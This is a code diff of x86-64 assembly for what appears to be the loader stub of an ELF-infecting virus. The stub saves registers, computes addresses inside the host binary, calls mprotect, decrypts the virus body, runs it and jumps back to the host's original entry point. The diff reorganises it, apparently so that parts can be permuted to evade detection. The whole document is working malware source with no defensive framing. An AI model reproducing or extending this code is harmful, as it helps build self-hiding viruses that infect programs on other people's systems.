@@ -20,6 +20,7 @@ section .text
 	global virus_header_struct
 	global mark_below
 	global return_to_client
+	global end_of_reg_permutable_code
 
 extern virus
 extern decypher
@@ -42,23 +43,23 @@ virus_header_struct:
 ;
 ; The code from mark_below to
 mark_below:
-	pop r12
+	pop rcx
+
+	push rcx                   ; backup rcx
+	push rdx                   ; backup rdx
 	push rbx                   ; backup rbx
+	push rsi                   ; backup rsi
+	push rdi                   ; backup rdi
+	push r8                    ; backup r8
+	push r9                    ; backup r9
+	push r10                   ; backup r10
+	push r11                   ; backup r11
 	push r12                   ; backup r12
 	push r13                   ; backup r13
 	push r14                   ; backup r14
 	push r15                   ; backup r15
 
-	push rdi                   ; backup rdi
-	push rsi                   ; backup rsi
-	push rdx                   ; backup rdx
-	push rcx                   ; backup rcx
-	push r8                    ; backup r8
-	push r9                    ; backup r9
-	push r10                   ; backup r10
-	push r11                   ; backup r11
-
-	mov rdx, r12
+	mov rdx, rcx
 
 	mov r8, rdx
 	mov r9, rdx
@@ -76,21 +77,21 @@ mark_below:
 	mov r11, [r11]
 	mov r14, [r14]
 
-	mov r12, rdx               ; get loader_entry addr
-	sub r12, virus_header_struct - loader_entry
+	mov rcx, rdx               ; get loader_entry addr
+	sub rcx, virus_header_struct - loader_entry
 
-	mov rcx, r12
-	xchg rcx, r8
-	sub r8, rcx                ; r8 = r12 - r8
-	mov rcx, r12
-	xchg rcx, r10
-	add r10, rcx               ; r10 = r12 + r10
-	mov rcx, r12
-	xchg rcx, r11
-	sub r11, rcx               ; r11 = r12 - r11
+	mov r12, rcx
+	xchg r12, r8
+	sub r8, r12                ; r8 = rcx - r8
+	mov r12, rcx
+	xchg r12, r10
+	add r10, r12               ; r10 = rcx + r10
+	mov r12, rcx
+	xchg r12, r11
+	sub r11, r12               ; r11 = rcx - r11
 
 	push r14                   ; save virus size    [rsp + 48]
-	push r12                   ; save loader_entry  [rsp + 40]
+	push rcx                   ; save loader_entry  [rsp + 40]
 	push r8                    ; save ptld addr     [rsp + 32]
 	push r9                    ; save ptld size     [rsp + 24]
 	push r10                   ; save virus addr    [rsp + 16]
@@ -109,10 +110,8 @@ after_woody:
 	jmp wrap_mprotect
 after_mprotect:
 ;------------------------------; decypher virus
-	mov rdi, [rsp + 16]        ; get virus_addr
-	mov rsi, [rsp + 48]        ; get virus_size
-
-	call decypher
+	jmp wrap_decypher
+after_decypher:
 ;------------------------------; launch virus
 	call virus
 ;------------------------------; return to client entry
@@ -120,20 +119,19 @@ return_to_client:
 	mov rax, [rsp + 8]         ; get entry addr
 	add rsp, 56                ; restore stack as it was
 
-	pop r11                    ; backup r11
-	pop r10                    ; backup r10
-	pop r9                     ; backup r9
-	pop r8                     ; backup r8
-	pop rcx                    ; backup rcx
-	pop rdx                    ; backup rdx
-	pop rsi                    ; backup rsi
-	pop rdi                    ; backup rdi
-
-	pop r15                    ; backup r15
-	pop r14                    ; backup r14
-	pop r13                    ; backup r13
-	pop r12                    ; backup r12
-	pop rbx                    ; backup rbx
+	pop r15                    ; restore r15
+	pop r14                    ; restore r14
+	pop r13                    ; restore r13
+	pop r12                    ; restore r12
+	pop r11                    ; restore r11
+	pop r10                    ; restore r10
+	pop r9                     ; restore r9
+	pop r8                     ; restore r8
+	pop rdi                    ; restore rdi
+	pop rsi                    ; restore rsi
+	pop rbx                    ; restore rbx
+	pop rdx                    ; restore rdx
+	pop rcx                    ; restore rcx
 
 	push rax
 	ret
@@ -169,4 +167,10 @@ wrap_woody:
 	add rsp, 16
 	jmp after_woody
 %endif
+wrap_decypher:
+	mov rdi, [rsp + 16]        ; get virus_addr
+	mov rsi, [rsp + 48]        ; get virus_size
+
+	call decypher
+	jmp after_decypher
 end_of_reg_non_permutable_code:
